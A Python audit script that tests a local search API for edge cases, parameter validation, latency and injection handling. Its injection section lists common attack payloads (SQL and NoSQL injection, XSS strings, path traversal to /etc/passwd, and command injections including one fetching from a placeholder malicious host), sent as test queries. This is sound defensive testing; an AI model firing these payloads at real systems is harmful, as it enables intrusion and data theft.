#!/usr/bin/env python3
"""
Comprehensive audit tests for search endpoints.
Tests edge cases, security vulnerabilities, and performance issues.
"""

import asyncio
import time
from typing import Any
import httpx


BASE_URL = "http://localhost:8000/api/v1"


class SearchAuditTester:
    """Test harness for search endpoint auditing."""

    def __init__(self, base_url: str = BASE_URL):
        self.base_url = base_url
        self.client = httpx.AsyncClient(timeout=30.0)
        self.results: list[dict[str, Any]] = []

    async def close(self):
        """Close the HTTP client."""
        await self.client.aclose()

    async def test_search(
        self,
        query: str,
        test_name: str,
        params: dict[str, Any] | None = None,
        expected_status: int = 200,
    ) -> dict[str, Any]:
        """Test a search query and record results."""
        url = f"{self.base_url}/search"
        params = params or {}
        params["q"] = query

        start_time = time.time()
        try:
            response = await self.client.get(url, params=params)
            duration_ms = (time.time() - start_time) * 1000

            result = {
                "test_name": test_name,
                "query": query,
                "params": params,
                "status_code": response.status_code,
                "expected_status": expected_status,
                "duration_ms": duration_ms,
                "passed": response.status_code == expected_status,
                "response": response.json() if response.status_code == 200 else response.text,
            }

            # Additional validation for successful responses
            if response.status_code == 200:
                data = response.json()
                result["results_count"] = len(data.get("results", []))
                result["total_found"] = data.get("total_found", 0)

            self.results.append(result)
            return result

        except Exception as e:
            result = {
                "test_name": test_name,
                "query": query,
                "params": params,
                "error": str(e),
                "passed": False,
                "duration_ms": (time.time() - start_time) * 1000,
            }
            self.results.append(result)
            return result

    async def run_edge_case_tests(self):
        """Run edge case tests."""
        print("🔍 Running Edge Case Tests...")

        # Empty query
        await self.test_search("", "Empty query", expected_status=422)

        # Whitespace only
        await self.test_search("   ", "Whitespace only")
        await self.test_search("\t\n", "Tab and newline")

        # Very long query
        long_query = "a" * 1000
        await self.test_search(long_query, "Very long query (1000 chars)")

        # Special characters
        await self.test_search("test!@#$%^&*()", "Special characters")
        await self.test_search("test<script>alert('xss')</script>", "XSS attempt")
        await self.test_search("test'; DROP TABLE words;--", "SQL injection attempt")
        await self.test_search("test\x00null", "Null byte injection")
        await self.test_search("test\r\nHeader: Value", "CRLF injection")

        # Unicode and encoding tests
        await self.test_search("café", "Unicode accented characters")
        await self.test_search("🔍search", "Emoji in query")
        await self.test_search("中文查询", "Chinese characters")
        await self.test_search("الع\u0631بية", "Arabic characters")
        await self.test_search("\u202e\u202dtest", "Unicode control characters")

        # Numeric queries
        await self.test_search("123", "Pure numeric")
        await self.test_search("3.14159", "Decimal number")
        await self.test_search("-42", "Negative number")
        await self.test_search("1e10", "Scientific notation")

        # Mixed content
        await self.test_search("test123", "Alphanumeric")
        await self.test_search("test-word", "Hyphenated")
        await self.test_search("test_word", "Underscore")
        await self.test_search("test.word", "Dot separated")

        # Case sensitivity
        await self.test_search("TEST", "All uppercase")
        await self.test_search("TeSt", "Mixed case")
        await self.test_search("test", "All lowercase")

        # Phrase queries
        await self.test_search("hello world", "Two word phrase")
        await self.test_search("the quick brown fox", "Multi-word phrase")
        await self.test_search('"exact phrase"', "Quoted phrase")

    async def run_parameter_validation_tests(self):
        """Run parameter validation tests."""
        print("\n📊 Running Parameter Validation Tests...")

        # Language parameter
        await self.test_search("test", "Valid language", {"language": "en"})
        await self.test_search("test", "Invalid language", {"language": "xyz"})
        await self.test_search("test", "Empty language", {"language": ""})
        await self.test_search("test", "Numeric language", {"language": "123"})

        # Max results parameter
        await self.test_search("test", "Max results = 0", {"max_results": 0}, expected_status=422)
        await self.test_search("test", "Max results = 1", {"max_results": 1})
        await self.test_search("test", "Max results = 100", {"max_results": 100})
        await self.test_search("test", "Max results = 101", {"max_results": 101}, expected_status=422)
        await self.test_search("test", "Max results = -1", {"max_results": -1}, expected_status=422)
        await self.test_search("test", "Max results = string", {"max_results": "abc"}, expected_status=422)
        await self.test_search("test", "Max results = float", {"max_results": 10.5}, expected_status=422)

        # Min score parameter
        await self.test_search("test", "Min score = 0", {"min_score": 0})
        await self.test_search("test", "Min score = 0.5", {"min_score": 0.5})
        await self.test_search("test", "Min score = 1", {"min_score": 1})
        await self.test_search("test", "Min score = 1.1", {"min_score": 1.1}, expected_status=422)
        await self.test_search("test", "Min score = -0.1", {"min_score": -0.1}, expected_status=422)
        await self.test_search("test", "Min score = string", {"min_score": "high"}, expected_status=422)

        # Multiple parameters
        await self.test_search(
            "test",
            "All valid params",
            {"language": "en", "max_results": 50, "min_score": 0.7}
        )

        # Unknown parameters (should be ignored)
        await self.test_search("test", "Unknown parameter", {"unknown_param": "value"})

    async def run_performance_tests(self):
        """Run performance tests."""
        print("\n⚡ Running Performance Tests...")

        # Single character queries
        for char in ["a", "e", "i", "o", "u"]:
            await self.test_search(char, f"Single character: {char}")

        # Common prefix patterns
        prefixes = ["the", "pre", "un", "re", "dis"]
        for prefix in prefixes:
            await self.test_search(prefix, f"Common prefix: {prefix}")

        # Concurrent requests
        print("\n🔄 Testing concurrent requests...")
        queries = ["test", "search", "query", "word", "find"]
        tasks = [
            self.test_search(query, f"Concurrent: {query}")
            for query in queries
        ]
        await asyncio.gather(*tasks)

        # Rapid sequential requests (rate limiting check)
        print("\n🚀 Testing rapid sequential requests...")
        for i in range(10):
            await self.test_search("rapid", f"Rapid request {i+1}")

    async def run_injection_tests(self):
        """Run security injection tests."""
        print("\n🛡️ Running Security Injection Tests...")

        # SQL injection attempts
        sql_injections = [
            "' OR '1'='1",
            "'; DROP TABLE words; --",
            "1' AND '1' = '1",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR 1=1#",
            "1' ORDER BY 1--+",
            "' AND SLEEP(5)--",
        ]
        for injection in sql_injections:
            await self.test_search(injection, f"SQL injection: {injection[:30]}...")

        # NoSQL injection attempts
        nosql_injections = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "sleep(5000)"}',
        ]
        for injection in nosql_injections:
            await self.test_search(injection, f"NoSQL injection: {injection[:30]}...")

        # XSS attempts
        xss_attempts = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
        ]
        for xss in xss_attempts:
            await self.test_search(xss, f"XSS attempt: {xss[:30]}...")

        # Path traversal attempts
        path_traversals = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]
        for traversal in path_traversals:
            await self.test_search(traversal, f"Path traversal: {traversal[:30]}...")

        # Command injection attempts
        command_injections = [
            "; ls -la",
            "| cat /etc/passwd",
            "& dir",
            "`whoami`",
            "$(curl http://malicious.com)",
        ]
        for cmd in command_injections:
            await self.test_search(cmd, f"Command injection: {cmd[:30]}...")

    async def run_path_endpoint_tests(self):
        """Test the path-based search endpoint."""
        print("\n🛤️ Running Path Endpoint Tests...")

        # Test path endpoint with various queries
        test_queries = [
            ("hello", "Normal path query"),
            ("hello world", "Path with spaces"),
            ("hello/world", "Path with slash"),
            ("hello%20world", "URL encoded space"),
            ("hello+world", "Plus as space"),
        ]

        for query, test_name in test_queries:
            url = f"{self.base_url}/search/{query}"
            try:
                response = await self.client.get(url)
                result = {
                    "test_name": test_name,
                    "query": query,
                    "endpoint": "path",
                    "status_code": response.status_code,
                    "passed": response.status_code == 200,
                }
                self.results.append(result)
            except Exception as e:
                result = {
                    "test_name": test_name,
                    "query": query,
                    "endpoint": "path",
                    "error": str(e),
                    "passed": False,
                }
                self.results.append(result)

    def print_summary(self):
        """Print test summary."""
        print("\n" + "=" * 80)
        print("📊 TEST SUMMARY")
        print("=" * 80)

        total_tests = len(self.results)
        passed_tests = sum(1 for r in self.results if r.get("passed", False))
        failed_tests = total_tests - passed_tests

        print(f"\nTotal Tests: {total_tests}")
        print(f"✅ Passed: {passed_tests}")
        print(f"❌ Failed: {failed_tests}")
        print(f"Success Rate: {(passed_tests/total_tests)*100:.1f}%")

        # Performance summary
        perf_results = [r for r in self.results if "duration_ms" in r and r.get("passed")]
        if perf_results:
            durations = [r["duration_ms"] for r in perf_results]
            print(f"\n⚡ Performance Metrics:")
            print(f"  Average Response Time: {sum(durations)/len(durations):.2f}ms")
            print(f"  Min Response Time: {min(durations):.2f}ms")
            print(f"  Max Response Time: {max(durations):.2f}ms")

        # Failed tests details
        if failed_tests > 0:
            print("\n❌ Failed Tests:")
            for result in self.results:
                if not result.get("passed", False):
                    print(f"  - {result['test_name']}: {result.get('error', f'Status {result.get('status_code')}')}")

        # Security findings
        security_tests = [r for r in self.results if "injection" in r["test_name"].lower() or "xss" in r["test_name"].lower()]
        security_passed = sum(1 for r in security_tests if r.get("passed", False))
        print(f"\n🛡️ Security Tests: {security_passed}/{len(security_tests)} passed")


async def main():
    """Run all audit tests."""
    print("🚀 Starting Search Endpoint Audit...")
    print(f"Target: {BASE_URL}")
    print("=" * 80)

    tester = SearchAuditTester()

    try:
        await tester.run_edge_case_tests()
        await tester.run_parameter_validation_tests()
        await tester.run_performance_tests()
        await tester.run_injection_tests()
        await tester.run_path_endpoint_tests()

        tester.print_summary()

    finally:
        await tester.close()


if __name__ == "__main__":
    asyncio.run(main())